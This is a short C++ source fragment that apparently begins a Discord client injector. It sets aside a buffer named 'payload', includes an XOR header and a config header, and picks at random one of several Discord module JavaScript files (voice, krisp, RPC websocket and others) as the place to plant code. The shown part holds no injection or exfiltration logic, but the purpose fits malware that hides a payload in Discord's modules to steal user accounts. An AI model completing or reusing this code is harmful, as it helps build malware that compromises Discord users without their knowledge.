#include <string>
#include <iostream>
#include <fstream>
#include <filesystem>
#include "xor.h"
#include "config.h"
namespace file_system = std::filesystem;
char buffer[_MAX_PATH]; // bad practise, no idea, also 1 AM.
char payload[600]; // bad practise, no idea, also 1 AM.

std::string get_random_module() {
    srand(time(NULL));

    std::string module_array[7] = { "discord_krisp\\index.js","discord_media\\index.js","discord_cloudsync\\index.js","discord_voice\\index.js","discord_utils\\index.js","discord_rpc\\RPCWebSocket.js","discord_dispatch\\index.js" };

    return module_array[rand() % 7];
}
